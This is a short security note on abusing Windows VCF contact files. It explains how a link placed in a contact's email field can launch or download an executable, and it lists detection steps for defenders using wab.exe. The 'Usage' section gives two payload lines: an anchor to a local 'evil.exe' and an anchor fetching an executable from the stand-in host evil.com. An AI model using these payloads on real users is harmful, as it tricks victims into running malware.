VCF is a standard file format used for storing contact information of individuals or distributed lists. VCF files contain the contact’s
name, address, email address, phone number,  their business or personal web page, etc. The VCF files are exchanged or shared via emails
to desired or interested parties.

Attackers or Adversaries include malicious web link or executables to VCF files and Operating System will not warn the users when the victim clicks
the file. The vulnerability can’t be exploited without user intervention or to trigger the malicious executables through VCF file , the malicious file
should be downloaded before in the system.


Usage :
A new Contact file will be created and the following parameters will be passed under email id in the VCF file.
<a href="evil.exe">abc@abc.com</a>
Victims will see the  a href="mailto:abc@abc[.]com in the VCF file and when the victim click the email id , the evil.exe
will be executed.

<a href="http://www.evil.com/evil.exe">abc@abc.com</a>

This makes the victim to download the exe file.

Detections:
1.Look for wab.exe prefetch files and Parsing the prefetch will provide the VCF file. 
2.Track the Command execution and arguments passed to wab.exe using EDR solutions and filter with http parameter and executables loaded.
3.Look for process wab.exe and its suspicious child process like web request or executables.
4.Look for Windows event id 4688 and search this WAB  as a keyword.
